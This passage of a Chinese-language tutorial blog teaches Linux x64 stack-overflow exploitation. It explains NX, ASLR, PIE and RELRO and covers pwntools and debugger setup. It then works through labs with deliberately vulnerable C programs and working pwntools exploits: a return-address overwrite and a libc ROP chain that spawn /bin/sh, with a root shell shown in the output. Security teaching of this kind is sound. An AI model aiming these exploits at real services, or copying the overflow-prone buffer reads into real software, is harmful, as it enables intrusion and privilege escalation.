<p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
<h3 id="ASLR-Address-space-layout-randomization"><a href="#ASLR-Address-space-layout-randomization" class="headerlink" title="ASLR (Address space layout randomization)"></a>ASLR (Address space layout randomization)</h3><p>ASLR是一种针对缓冲区溢出的安全保护技术，通过对<strong>堆、栈、共享库映射</strong>等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。如今Linux、FreeBSD、Windows等主流操作系统都已采用了该技术。此技术需要操作系统和软件相配合。ASLR在linux中使用此技术后，杀死某程序后重新开启,地址就会会改变</p>
<p>在Linux上<br>关闭ASLR，切换至root用户，输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>开启ASLR，切换至root用户，输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
<p>上面的序号代表意思如下:<br>0 - 表示关闭进程地址空间随机化。<br>1 - 表示将mmap的基址，stack和vdso页面随机化。<br>2 - 表示在1的基础上增加栈（heap）的随机化。<br>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
<h3 id="PIE和PIC"><a href="#PIE和PIC" class="headerlink" title="PIE和PIC"></a>PIE和PIC</h3><p>PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。<br>-fPIC与-fpic都是在编译时加入的选项，用于生成**位置无关的代码(Position-Independent-Code)<strong>。这两个选项都是可以使代码在加载到内存时使用相对地址，所有对</strong>固定地址的访问都通过全局偏移表(GOT)**来实现。-fPIC和-fpic最大的区别在于是否对GOT的大小有限制。-fPIC对GOT表大小无限制，所以如果在不确定的情况下，使用-fPIC是更好的选择。<br>-fPIE与-fpie是等价的。这个选项与-fPIC&#x2F;-fpic大致相同，不同点在于：-fPIC用于生成动态库，-fPIE用与生成可执行文件。再说得直白一点：-fPIE用来生成位置无关的可执行代码。</p>
<p>PIE和ASLR不是一样的作用，ASLR只能对堆、栈,libc和mmap随机化，而不能对如代码段，数据段随机化，使用PIE+ASLR则可以对代码段和数据段随机化。<br>区别是ASLR是系统功能选项，PIE和PIC是编译器功能选项。<br>联系点在于在开启ASLR之后，PIE才会生效。<br>开启命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c				 // 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o test test.c	 // 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c	 // 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c		 // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c		 // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>

<h3 id="RELRO-read-only-relocation"><a href="#RELRO-read-only-relocation" class="headerlink" title="RELRO(read only relocation)"></a>RELRO(read only relocation)</h3><p>在很多时候利用漏洞时可以写的内存区域通常是黑客攻击的目标，尤其是存储函数指针的区域。 而动态链接的ELF二进制文件使用称为全局偏移表（GOT）的查找表来动态解析共享库中的函数，GOT就成为了黑客关注的目标之一，</p>
<p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。**大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域,GOT为只读.**设置符号重定向表为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。如果RELRO为 “Partial RELRO”，说明我们对GOT表具有写权限。<br>开启命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c              // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c   // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c      // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o test test.c       // 全部开启</span><br></pre></td></tr></table></figure>
<p>开启FullRELRO后写利用时就不能复写got表。</p>
<h2 id="pwn工具常见整合"><a href="#pwn工具常见整合" class="headerlink" title="pwn工具常见整合"></a>pwn工具常见整合</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>pwntools是一个二进制利用框架,网上关于pwntools的用法教程很多，学好pwntools对于做漏洞的利用和理解漏洞有很好的帮助。可以利用pwntools库开发基于python的漏洞利用脚本。</p>
<h3 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h3><p>pycharm可以实时调试和编写攻击脚本，提高了写利用的效率。</p>
<ol>
<li><p>在远程主机上执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:10001,fork EXEC:./linux_x64_test1</span><br></pre></td></tr></table></figure>
</li>
<li><p>用pycharm工具开发pwn代码，远程连接程序进行pwn测试。<br>需要设置环境变量 TERM&#x3D;linux;TERMINFO&#x3D;&#x2F;etc&#x2F;terminfo，并勾选 Emulate terminal in output coonsoole<br><img src="https://i.loli.net/2020/05/20/mKT2Jdgq6BHWNXs.jpg" alt="-w541"><br>然后pwntools的python脚本使用远程连接</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = remote(<span class="string">&#x27;172.16.36.176&#x27;</span>, <span class="number">10001</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">raw_input() <span class="comment"># for debug</span></span><br><span class="line">...</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>当pwntools开发的python脚本暂停时，远程ida可以附加查看信息</p>
<h3 id="gdb附加"><a href="#gdb附加" class="headerlink" title="gdb附加"></a>gdb附加</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line">...</span><br><span class="line"><span class="comment"># Get PID(s) of target. The returned PID(s) depends on the type of target:</span></span><br><span class="line">m_pid=pwn.proc.pidof(p)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;attach %d&quot;</span> % m_pid)</span><br><span class="line">pwn.gdb.attach(m_pid) <span class="comment"># 链接gdb调试，先在gdb界面按下n下一步返回python控制台enter继续(两窗口同步)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n##########sending payload##########\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pwn.pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="gdb插件枚举"><a href="#gdb插件枚举" class="headerlink" title="gdb插件枚举"></a>gdb插件枚举</h3><p>1)PEDA - Python Exploit Development Assistance for GDB(<a href="https://github.com/longld/peda">https://github.com/longld/peda</a>)<br>可以很清晰的查看到堆栈信息，寄存器和反汇编信息<br>git clone <a href="https://github.com/longld/peda.git">https://github.com/longld/peda.git</a> ~&#x2F;panda&#x2F;peda<br>echo “source ~&#x2F;panda&#x2F;peda&#x2F;peda.py” &gt;&gt; ~&#x2F;.gdbinit</p>
<p>2)GDB Enhanced Features(<a href="https://github.com/hugsy/gef">https://github.com/hugsy/gef</a>)<br>peda的增强版，因为它支持更多的架构(ARM, MIPS, POWERPC…)，和更加强大的模块,并且和ida联动。</p>
<p>3)libheap(查看堆信息)<br>pip3 install libheap –verbose</p>
<h3 id="EDB附加"><a href="#EDB附加" class="headerlink" title="EDB附加"></a>EDB附加</h3><p>EDB 是一个可视化的跨平台调试器，跟win上的Ollydbg很像。</p>
<h3 id="lldb插件"><a href="#lldb插件" class="headerlink" title="lldb插件"></a>lldb插件</h3><p>voltron &amp; lisa。一个拥有舒服的ui界面，一个简洁但又拥有实用功能的插件。<br><a href="https://github.com/snare/voltron/">voltron</a><br>配合tmux会产生很好的效果，如下:<br><img src="https://i.loli.net/2020/05/20/khMaumY2D4gIsxl.jpg" alt="-w820"></p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>通过几个例子来了解常见的几种保护手段和熟悉常见的攻击手法。<br>实践平台 ubuntu 14.16_x64</p>
<h3 id="实践1-栈溢出-利用溢出改变程序走向"><a href="#实践1-栈溢出-利用溢出改变程序走向" class="headerlink" title="实践1_栈溢出_利用溢出改变程序走向"></a>实践1_栈溢出_利用溢出改变程序走向</h3><h4 id="编译测试用例"><a href="#编译测试用例" class="headerlink" title="编译测试用例"></a>编译测试用例</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">callsystem</span><span class="params">()</span></span><br><span class="line">&#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;callsystem = %p\n&quot;</span>, callsystem);</span><br><span class="line">write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line"><span class="comment">// /dev/stdin    fd/0</span></span><br><span class="line"><span class="comment">// /dev/stdout   fd/1</span></span><br><span class="line"><span class="comment">// /dev/stderr   fd/2</span></span><br><span class="line">	vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line">gcc -fno-stack-protector -no-pie linux_x64_test1.c -o linux_x64_test1 -ldl //禁用栈保护</span><br></pre></td></tr></table></figure>
<p>检测如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec linux_x64_test1</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
<p>发现没有栈保护，没有CANARY保护</p>
<h4 id="生成构造的数据"><a href="#生成构造的数据" class="headerlink" title="生成构造的数据"></a>生成构造的数据</h4><p>这里用到一个脚本pattern.py来生成随机数据，来自<a href="https://github.com/SaltwaterC/sploit-tools.git">这里</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 pattern.py create 150</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure>
<h4 id="获取到溢出偏移"><a href="#获取到溢出偏移" class="headerlink" title="获取到溢出偏移"></a>获取到溢出偏移</h4><p>用lldb进行调试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ lldb linux_x64_test1</span><br><span class="line">(lldb) target create <span class="string">&quot;linux_x64_test1&quot;</span></span><br><span class="line">Current executable <span class="built_in">set</span> to <span class="string">&#x27;linux_x64_test1&#x27;</span> (x86_64).</span><br><span class="line">(lldb) run</span><br><span class="line">Process 117360 launched: <span class="string">&#x27;/home/panda/Desktop/test/linux_x64_test1&#x27;</span> (x86_64)</span><br><span class="line">Hello, World</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br><span class="line">Process 117360 stopped</span><br><span class="line">* thread <span class="comment">#1: tid = 117360, 0x00000000004005e7 linux_x64_test1`vulnerable_function + 32, name = &#x27;linux_x64_test1&#x27;, stop reason = signal SIGSEGV: invalid address (fault address: 0x0)</span></span><br><span class="line">    frame <span class="comment">#0: 0x00000000004005e7 linux_x64_test1`vulnerable_function + 32</span></span><br><span class="line">linux_x64_test1`vulnerable_function:</span><br><span class="line">-&gt;  0x4005e7 &lt;+32&gt;: retq</span><br><span class="line"></span><br><span class="line">linux_x64_test1`main:</span><br><span class="line">    0x4005e8 &lt;+0&gt;:  pushq  %rbp</span><br><span class="line">    0x4005e9 &lt;+1&gt;:  movq   %rsp, %rbp</span><br><span class="line">    0x4005ec &lt;+4&gt;:  subq   <span class="variable">$0x10</span>, %rsp</span><br><span class="line">(lldb) x/xg <span class="variable">$rsp</span>  <span class="comment"># memory read --size 8 --format x --count 8 $rsp</span></span><br><span class="line"></span><br><span class="line">0x7fffffffdd58: 0x3765413665413565</span><br><span class="line"></span><br><span class="line">python2 pattern.py offset 0x3765413665413565</span><br><span class="line">hex pattern decoded as: e5Ae6Ae7</span><br><span class="line">136</span><br></pre></td></tr></table></figure>
<p>发现 溢出字符串长度为 136+ret_address</p>
<h4 id="获取-callsystem-函数地址"><a href="#获取-callsystem-函数地址" class="headerlink" title="获取 callsystem 函数地址"></a>获取 callsystem 函数地址</h4><p>因为代码中存在辅助函数callsystem，直接获取地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ nm linux_x64_test1|grep call</span><br><span class="line">00000000004005b6 T callsystem</span><br></pre></td></tr></table></figure>
<h4 id="编写并测试利用-提权"><a href="#编写并测试利用-提权" class="headerlink" title="编写并测试利用_提权"></a>编写并测试利用_提权</h4><p>pwntools是一个二进制利用框架，可以用python编写一些利用脚本，方便达到利用漏洞的目的，当然也可以用其他手段。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = pwn.process(<span class="string">&quot;./linux_x64_test1&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;172.16.36.174&#x27;, 10002)</span></span><br><span class="line">callsystem_address = <span class="number">0x00000000004005b6</span></span><br><span class="line">payload=<span class="string">&quot;A&quot;</span>*<span class="number">136</span> + pwn.p64(callsystem_address)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>测试利用拿到shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ python test.py </span><br><span class="line">[+] Starting local process &#x27;./linux_x64_test1&#x27;: pid 117455</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">panda</span><br></pre></td></tr></table></figure>
<p>将二进制程序设置为服务端程序,后续文章不再说明</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:10001,fork EXEC:./linux_x64_test1</span><br></pre></td></tr></table></figure>
<p>测试远程程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ python test2.py </span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">panda</span><br></pre></td></tr></table></figure>
<p>如果这个进程是root</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo socat TCP4-LISTEN:10001,fork EXEC:./linux_x64_test1</span><br></pre></td></tr></table></figure>
<p>测试远程程序，提权成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ python test.py </span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="实践2-栈溢出-通过ROP绕过DEP和ASLR防护"><a href="#实践2-栈溢出-通过ROP绕过DEP和ASLR防护" class="headerlink" title="实践2_栈溢出_通过ROP绕过DEP和ASLR防护"></a>实践2_栈溢出_通过ROP绕过DEP和ASLR防护</h3><h4 id="编译测试用例-1"><a href="#编译测试用例-1" class="headerlink" title="编译测试用例"></a>编译测试用例</h4><p>开启ASLR后,libc地址会不断变化,这里先不讨论怎么获取真实system地址，用了一个辅助函数打印system地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">systemaddr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span>* handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,dlsym(handle,<span class="string">&quot;system&quot;</span>));</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line">gcc -fno-stack-protector linux_x64_test2.c -o linux_x64_test2 -ldl //禁用栈保护</span><br></pre></td></tr></table></figure>
<p>检测如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec linux_x64_test2</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
<p>观察ASLR，运行两次,发现每次libc的system函数地址会变化，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ ./linux_x64_test2 </span><br><span class="line">0x7f9d7d71a390</span><br><span class="line">Hello, World</span><br><span class="line"></span><br><span class="line">panda@ubuntu:~/Desktop/test$ ./linux_x64_test2 </span><br><span class="line">0x7fa84dc3d390</span><br><span class="line">Hello, World</span><br></pre></td></tr></table></figure>
<h4 id="ROP简介"><a href="#ROP简介" class="headerlink" title="ROP简介"></a>ROP简介</h4><p>ROP的全称为Return-oriented programming（返回导向编程）,是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行DEP和代码签名等）</p>
<h4 id="寻找ROP"><a href="#寻找ROP" class="headerlink" title="寻找ROP"></a>寻找ROP</h4><p>我们希望最后执行system(“&#x2F;bin&#x2F;sh”)，缓冲区溢出后传入”&#x2F;bin&#x2F;sh”的地址和函数system地址。<br>我们想要的x64的gadget一般如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pop rdi  // rdi=<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">ret      // call system_addr</span><br><span class="line"></span><br><span class="line">pop rdi  // rdi=<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">pop rax  // rax= system_addr</span><br><span class="line">call rax // call system_addr</span><br></pre></td></tr></table></figure>
<p>系统开启了aslr，只能通过相对偏移来计算gadget，在二进制中搜索，这里用到工具<a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ ROPgadget --binary linux_x64_test2 --only &quot;pop|sret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 0</span><br></pre></td></tr></table></figure>
<p>获取二进制的链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ ldd linux_x64_test2</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffeae9ec000)</span><br><span class="line">	libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fdc0531f000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fdc04f55000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007fdc05523000)</span><br></pre></td></tr></table></figure>
<p>在库中搜索 pop ret</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot; |grep rdi</span><br><span class="line">0x0000000000020256 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000021102 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
<p>决定用 0x0000000000021102<br>在库中搜索 &#x2F;bin&#x2F;sh 字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000018cd57 : /bin/sh</span><br></pre></td></tr></table></figure>
<h4 id="构造利用并测试"><a href="#构造利用并测试" class="headerlink" title="构造利用并测试"></a>构造利用并测试</h4><p>这里实现两种gadgets 实现利用目的，分别是version1和version2</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">libc = pwn.ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># p = pwn.process(&quot;./linux_x64_test2&quot;)</span></span><br><span class="line">p = pwn.remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">systema_addr_str = p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">systema_addr = <span class="built_in">int</span>(systema_addr_str,<span class="number">16</span>)  <span class="comment"># now system addr</span></span><br><span class="line"></span><br><span class="line">binsh_static = <span class="number">0x000000000018cd57</span></span><br><span class="line">binsh2_static = <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh_static   = 0x%x&quot;</span> % binsh_static)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh2_static  = 0x%x&quot;</span> % binsh2_static)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_offset = binsh2_static - libc.symbols[<span class="string">&quot;system&quot;</span>] <span class="comment"># offset = static1 - static2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh_offset   = 0x%x&quot;</span> % binsh_offset)</span><br><span class="line"></span><br><span class="line">binsh_addr = binsh_offset + systema_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh_addr     = 0x%x&quot;</span> % binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># version1</span></span><br><span class="line"><span class="comment"># pop_ret_static = 0x0000000000021102 # pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop_ret_offset = pop_ret_static - libc.symbols[&quot;system&quot;]</span></span><br><span class="line"><span class="comment"># print(&quot;pop_ret_offset = 0x%x&quot; % pop_ret_offset)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop_ret_addr = pop_ret_offset + systema_addr</span></span><br><span class="line"><span class="comment"># print(&quot;pop_ret_addr   = 0x%x&quot; % pop_ret_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload=&quot;A&quot;*136 +pwn.p64(pop_ret_addr)+pwn.p64(binsh_addr)+pwn.p64(systema_addr)</span></span><br><span class="line"><span class="comment"># binsh_addr      低   x64 第一个参数是rdi</span></span><br><span class="line"><span class="comment"># systema_addr    高</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># version2</span></span><br><span class="line">pop_pop_call_static = <span class="number">0x0000000000107419</span> <span class="comment">#  pop rax ; pop rdi ; call rax</span></span><br><span class="line">pop_pop_call_offset = pop_pop_call_static - libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pop_pop_call_offset = 0x%x&quot;</span> % pop_pop_call_offset)</span><br><span class="line"></span><br><span class="line">pop_pop_call_addr = pop_pop_call_offset + systema_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pop_pop_call_addr    = 0x%x&quot;</span> % pop_pop_call_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;A&quot;</span>*<span class="number">136</span> +pwn.p64(pop_pop_call_addr)+pwn.p64(systema_addr)+pwn.p64(binsh_addr)</span><br><span class="line"><span class="comment"># systema_addr      低   pop rax</span></span><br><span class="line"><span class="comment"># binsh_addr        高   pop rdi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n##########sending payload##########\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>最后测试如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ python test2.py </span><br><span class="line">[*] <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./linux_x64_test2&#x27;</span>: pid 118889</span><br><span class="line">binsh_static   = 0x18cd57</span><br><span class="line">binsh2_static  = 0x18cd57</span><br><span class="line">binsh_offset   = 0x1479c7</span><br><span class="line">binsh_addr     = 0x7fc3018ffd57</span><br><span class="line">pop_ret_offset = 0x-2428e</span><br><span class="line">pop_ret_addr   = 0x7fc301794102</span><br><span class="line"></span><br><span class="line"><span class="comment">##########sending payload##########</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">panda</span><br></pre></td></tr></table></figure>
<h3 id="实践3-栈溢出-去掉辅助函数"><a href="#实践3-栈溢出-去掉辅助函数" class="headerlink" title="实践3_栈溢出_去掉辅助函数"></a>实践3_栈溢出_去掉辅助函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译方法：</p>
